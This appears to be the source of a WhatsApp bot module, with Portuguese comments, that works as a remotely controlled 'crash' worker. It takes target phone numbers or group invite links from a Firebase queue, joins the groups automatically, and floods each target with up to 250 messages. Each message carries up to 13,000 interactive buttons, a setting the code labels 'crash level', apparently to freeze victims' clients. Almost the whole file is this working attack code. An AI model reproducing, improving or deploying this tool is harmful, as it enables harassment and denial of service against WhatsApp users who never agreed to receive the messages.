
"use strict";

const fs = require("fs");
const path = require("path");

/* =====================================================
   CONFIGURAÇÃO PRINCIPAL (SINCRONIZADA VIA FIREBASE)
===================================================== */

const CONFIG = {
  nome: "🤖「 AMHEEX-BOT 」🤖",

  footer: "🤖「 AMHEEX-BOT 」🤖",

  // URLs do Firebase Realtime Database
  firebaseBaseUrl: "https://amheex-default-rtdb.firebaseio.com/wa",

  // Estado e Limites Globais
  envioAtivo: true,
  limiteMensagens: 250,
  limiteBotoes: 13000,

  // Intervalo de verificação da fila e sincronização da config (ms)
  intervaloVerificacaoFila: 5000,

  // Intervalo do Heartbeat / Status de Presença (ms)
  intervaloPing: 60000,

  // Caminhos e Atributos
  imagem: path.join("assets", "img", "icon.png"),
  pastaTextos: path.join("src", "TextEdition"),
  pastasAlternativas: [
    path.join("ListLoad"),
    path.join("assets", "ListLoad"),
  ],

  intervaloEnvio: 10,
  enviarImagemFrames: true,
  enviarImagemResumo: true,

  suporte: {
    ativo: true,
    texto: "📞 Suporte",
    url: "https://wa.me/5546999020341?text=AMHEEX%20Ol%C3%A1",
  },
};

/* =====================================================
   DIRETÓRIO BASE
===================================================== */

const BASE_DIR = process.cwd();

/* =====================================================
   INTEGRAÇÃO E LEITURA AUTOMÁTICA DE CONFIG (FIREBASE)
===================================================== */

let processandoFila = false;
let socketGlobal = null;

// Busca status e configs dinâmicas no servidor e envia Heartbeat
async function sincronizarEEnviarPing() {
  try {
    const mainUrl = `${CONFIG.firebaseBaseUrl}.json`;

    // 1. Envia o Ping de presença online
    await fetch(mainUrl, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        lastPing: new Date().toISOString(),
      }),
    });

    // 2. Lê configurações globais do servidor
    const res = await fetch(mainUrl);
    if (res.ok) {
      const data = (await res.json()) || {};

      if (typeof data.envioAtivo === "boolean")
        CONFIG.envioAtivo = data.envioAtivo;
      if (typeof data.limiteMensagens === "number")
        CONFIG.limiteMensagens = data.limiteMensagens;
      if (typeof data.limiteBotoes === "number")
        CONFIG.limiteBotoes = data.limiteBotoes;
    }
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao sincronizar/pingar:",
      error?.message || error
    );
  }
}

// Sincroniza e incrementa contadores no Firebase
async function incrementarContadorFirebase(tipoAlvo) {
  try {
    const mainUrl = `${CONFIG.firebaseBaseUrl}.json`;
    const getRes = await fetch(mainUrl);
    const data = (await getRes.json()) || {};

    let totalPv = Number(data.totalPv || 0);
    let totalGrupo = Number(data.totalGrupo || 0);

    if (tipoAlvo === "pv") totalPv++;
    else if (tipoAlvo === "grupo") totalGrupo++;

    await fetch(mainUrl, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        totalPv,
        totalGrupo,
        lastUpdate: new Date().toISOString(),
      }),
    });
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao atualizar contadores:",
      error?.message || error
    );
  }
}

// Processa novos itens adicionados na fila do Firebase (/wa/list.json)
async function processarFilaFirebase(socket) {
  await sincronizarEEnviarPing();

  if (!CONFIG.envioAtivo || processandoFila || !socket) return;

  processandoFila = true;

  try {
    const listUrl = `${CONFIG.firebaseBaseUrl}/list.json`;
    const res = await fetch(listUrl);
    if (!res.ok) {
      processandoFila = false;
      return;
    }

    const lista = await res.json();
    if (!lista) {
      processandoFila = false;
      return;
    }

    const keys = Object.keys(lista);
    let itemPendenteKey = null;
    let itemPendente = null;

    for (const key of keys) {
      if (lista[key] && lista[key].status === "pendente") {
        itemPendenteKey = key;
        itemPendente = lista[key];
        break;
      }
    }

    if (!itemPendenteKey || !itemPendente) {
      processandoFila = false;
      return;
    }

    console.log(
      `[FIREBASE] Item detectado no servidor! ID: ${itemPendenteKey}`
    );

    await fetch(
      `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
      {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          status: "processando",
          iniciadoEm: new Date().toISOString(),
        }),
      }
    );

    let alvoJid = null;
    if (
      itemPendente.tipoAlvo === "grupo" &&
      itemPendente.alvo.includes("chat.whatsapp.com")
    ) {
      const inviteCode = extrairInviteCode(itemPendente.alvo);
      if (inviteCode) {
        try {
          const grupo = await socket.groupAcceptInvite(inviteCode);
          alvoJid = normalizarJid(grupo);
        } catch (e) {
          console.error(
            `[FIREBASE] Falha ao entrar no grupo: ${inviteCode}`
          );
        }
      }
    } else {
      alvoJid = extrairNumero(itemPendente.alvo);
    }

    if (!alvoJid) {
      console.error(
        `[FIREBASE] Alvo inválido. Removendo item: ${itemPendenteKey}`
      );
      await fetch(
        `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
        {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: "erro_alvo_invalido" }),
        }
      );
      processandoFila = false;
      return;
    }

    const frames = carregarFrames();
    const qtdMensagens = limitarNumero(
      itemPendente.qtdMensagens || 1,
      1,
      CONFIG.limiteMensagens
    );
    const qtdBotoes = limitarNumero(
      itemPendente.crashNivel || 1000,
      1,
      CONFIG.limiteBotoes
    );

    let enviados = 0;
    for (let i = 0; i < qtdMensagens; i++) {
      const botoes = gerarBotoes(qtdBotoes, i + 1);
      const frame = frames[i % frames.length];

      try {
        await enviarComImagemEBotoes(socket, alvoJid, {
          texto: ` ${frame} `,
          footer: CONFIG.footer,
          botoes,
          quoted: null,
          usarImagem: CONFIG.enviarImagemFrames,
        });
        enviados++;
        console.log(
          `[FIREBASE WORKER] Enviado ${enviados}/${qtdMensagens} para ${alvoJid}`
        );
      } catch (err) {
        console.error(
          `[FIREBASE WORKER] Erro no envio frame ${i + 1}:`,
          err?.message || err
        );
      }

      if (i + 1 < qtdMensagens) {
        await esperar(CONFIG.intervaloEnvio);
      }
    }

    await incrementarContadorFirebase(itemPendente.tipoAlvo);

    await fetch(
      `${CONFIG.firebaseBaseUrl}/list/${itemPendenteKey}.json`,
      {
        method: "DELETE",
      }
    );

    console.log(
      `[FIREBASE] Item ${itemPendenteKey} processado e concluído.`
    );
  } catch (error) {
    console.error(
      "[FIREBASE] Erro ao processar item do servidor:",
      error?.message || error
    );
  } finally {
    processandoFila = false;
  }
}

/* =====================================================
   IMPORTAÇÃO DOS BOTÕES
===================================================== */

let sendButtons = null;
let sendInteractiveMessage = null;

try {
  const buttonsPath = path.join(process.cwd(), "src", "buttons");
  const buttonsModule = require(buttonsPath);

  if (typeof buttonsModule?.sendButtons === "function") {
    sendButtons = buttonsModule.sendButtons;
  }

  if (
    typeof buttonsModule?.sendInteractiveMessage === "function"
  ) {
    sendInteractiveMessage = buttonsModule.sendInteractiveMessage;
  }

  console.log("[TRAVAR] Sistema de botões carregado.");
} catch (error) {
  console.log(
    "[TRAVAR] Sistema de botões indisponível:",
    error?.message || error
  );
}

/* =====================================================
   HELPERS GERAIS
===================================================== */

const esperar = (ms) =>
  new Promise((resolve) => setTimeout(resolve, ms));

function obterSocket(ctx) {
  return (
    ctx?.socket ||
    ctx?.sock ||
    ctx?.client ||
    ctx?.conn ||
    ctx
  );
}

function normalizarJid(jid) {
  if (!jid) return null;
  const valor = String(jid).trim();

  if (valor.endsWith("@g.us")) return valor;
  if (
    valor.endsWith("@s.whatsapp.net") ||
    valor.endsWith("@c.us")
  ) {
    return valor.replace("@c.us", "@s.whatsapp.net");
  }

  return null;
}

function extrairNumero(texto = "") {
  const numero = String(texto).replace(/\D/g, "");
  if (numero.length < 10) return null;
  return `${numero}@s.whatsapp.net`;
}

function extrairInviteCode(texto = "") {
  const match = String(texto).match(
    /chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i
  );
  return match ? match[1] : null;
}

function limitarNumero(valor, minimo, maximo) {
  const numero = Number(valor);
  if (!Number.isFinite(numero)) return minimo;
  return Math.min(
    maximo,
    Math.max(minimo, Math.floor(numero))
  );
}

/* =====================================================
   PASTA DOS TEXTOS & IMAGEM
===================================================== */

function localizarPastaTextos() {
  const pastas = [
    path.join(BASE_DIR, CONFIG.pastaTextos),
    path.join(process.cwd(), CONFIG.pastaTextos),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(BASE_DIR, pasta)
    ),
    ...CONFIG.pastasAlternativas.map((pasta) =>
      path.join(process.cwd(), pasta)
    ),
  ];

  for (const pasta of pastas) {
    if (fs.existsSync(pasta)) return pasta;
  }
  return null;
}

function carregarFrames() {
  const pasta = localizarPastaTextos();
  if (!pasta)
    throw new Error("Nenhuma pasta de textos foi encontrada.");

  const arquivos = fs
    .readdirSync(pasta)
    .filter((arquivo) =>
      arquivo.toLowerCase().endsWith(".txt")
    )
    .sort(
      (a, b) =>
        (Number(a.split(".")[0]) || 0) -
        (Number(b.split(".")[0]) || 0)
    );

  if (!arquivos.length)
    throw new Error("Nenhum arquivo .txt foi encontrado.");

  const frames = [];
  for (const arquivo of arquivos) {
    const caminho = path.join(pasta, arquivo);
    try {
      const conteudo = fs.readFileSync(caminho, "utf8").trim();
      if (conteudo) frames.push(conteudo);
    } catch (error) {
      console.log(
        "[TRAVAR] Erro ao ler arquivo:",
        arquivo,
        error?.message || error
      );
    }
  }

  return frames;
}

function obterCaminhoImagem() {
  const caminhos = [
    path.join(BASE_DIR, CONFIG.imagem),
    path.join(process.cwd(), CONFIG.imagem),
  ];

  for (const caminho of caminhos) {
    if (fs.existsSync(caminho)) return caminho;
  }
  return null;
}

function obterImagem() {
  const caminho = obterCaminhoImagem();
  if (!caminho) return null;

  try {
    return fs.readFileSync(caminho);
  } catch (error) {
    console.log(
      "[TRAVAR] Erro ao carregar imagem:",
      error?.message || error
    );
    return null;
  }
}

/* =====================================================
   BOTÕES E ENVIO DE MENSAGENS
===================================================== */

function gerarBotoes(qtd, indexMensagem) {
  const quantidade = limitarNumero(
    qtd,
    1,
    CONFIG.limiteBotoes
  );
  const botoes = [];

  for (let i = 1; i <= quantidade; i++) {
    botoes.push({
      id: `travar_${indexMensagem}_${i}`,
      text: `🤖「 #${i} 」 🤖`,
    });
  }

  return botoes;
}

async function enviarMsgComBotoesNative(
  socket,
  jid,
  {
    texto,
    footer = "",
    botoes = [],
    imagem = null,
    quoted = null,
  }
) {
  const botoesFormatados = botoes.map((botao) => {
    if (botao.type === "url" || botao.url) {
      return {
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: botao.text,
          url: botao.url,
          merchant_url: botao.url,
        }),
      };
    }

    if (botao.type === "copy") {
      return {
        name: "cta_copy",
        buttonParamsJson: JSON.stringify({
          display_text: botao.text,
          id: botao.id || "copiar",
          copy_code: botao.copy_code || "",
        }),
      };
    }

    return {
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({
        display_text: botao.text,
        id: botao.id || botao.text,
      }),
    };
  });

  let header = { hasMediaAttachment: false };

  if (imagem) {
    try {
      let preparedMedia = null;
      if (typeof socket.waUploadToServer === "function") {
        preparedMedia = await socket.waUploadToServer(
          imagem,
          { mediaType: "image" }
        );
      }

      if (preparedMedia?.url) {
        header = {
          title: CONFIG.nome,
          hasMediaAttachment: true,
          imageMessage: {
            url: preparedMedia.url,
            mimetype: "image/png",
            mediaKey: preparedMedia.mediaKey,
            fileEncSha256: preparedMedia.fileEncSha256,
            fileSha256: preparedMedia.fileSha256,
            fileLength: preparedMedia.fileLength,
            jpegThumbnail: imagem,
          },
        };
      } else {
        header = {
          title: CONFIG.nome,
          hasMediaAttachment: true,
          imageMessage: {
            jpegThumbnail: imagem,
          },
        };
      }
    } catch (e) {
      header = {
        title: CONFIG.nome,
        hasMediaAttachment: true,
        imageMessage: {
          jpegThumbnail: imagem,
        },
      };
    }
  }

  const mensagem = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: String(texto) },
          footer: { text: String(footer) },
          header,
          nativeFlowMessage: {
            buttons: botoesFormatados,
          },
        },
      },
    },
  };

  return socket.sendMessage(jid, mensagem, {
    quoted: quoted || undefined,
  });
}

async function enviarComImagemEBotoes(
  socket,
  jid,
  { texto, footer, botoes, quoted, usarImagem = true }
) {
  const imagem = usarImagem ? obterImagem() : null;

  if (typeof sendInteractiveMessage === "function") {
    try {
      return await sendInteractiveMessage(socket, jid, {
        image: imagem,
        text: String(texto),
        footer: footer || CONFIG.footer,
        quoted,
        interactiveButtons: botoes.map((botao) => {
          if (botao.type === "url" || botao.url) {
            return {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: botao.text,
                url: botao.url,
                merchant_url: botao.url,
              }),
            };
          }

          return {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: botao.text,
              id: botao.id || botao.text,
            }),
          };
        }),
      });
    } catch (error) {
      console.log(
        "[TRAVAR] Interactive falhou:",
        error?.message || error
      );
    }
  }

  if (typeof sendButtons === "function") {
    try {
      return await sendButtons(socket, jid, {
        text: String(texto),
        footer: footer || CONFIG.footer,
        buttons: botoes,
        image: imagem,
        quoted,
      });
    } catch (error) {
      console.log(
        "[TRAVAR] sendButtons falhou:",
        error?.message || error
      );
    }
  }

  return enviarMsgComBotoesNative(socket, jid, {
    texto,
    footer: footer || CONFIG.footer,
    botoes,
    imagem,
    quoted,
  });
}

/* =====================================================
   LOOPS PERMANENTES DE CONEXÃO FIREBASE
===================================================== */

setInterval(() => {
  sincronizarEEnviarPing();
}, CONFIG.intervaloPing);

setInterval(() => {
  if (socketGlobal) {
    processarFilaFirebase(socketGlobal);
  }
}, CONFIG.intervaloVerificacaoFila);

// Dispara a sincronização inicial ao carregar o arquivo
sincronizarEEnviarPing();

/* =====================================================
   MÓDULO PRINCIPAL DE REGISTRO
===================================================== */

module.exports = {
  name: "srv",

  prefixes: [],

  commands: [],

  aliases: [],

  description:
    "🔒 Worker automatizado via Firebase (sem comandos manuais)",

  handle: async (ctx = {}) => {
    const socket = obterSocket(ctx);
    if (socket) {
      socketGlobal = socket;
    }
  },
};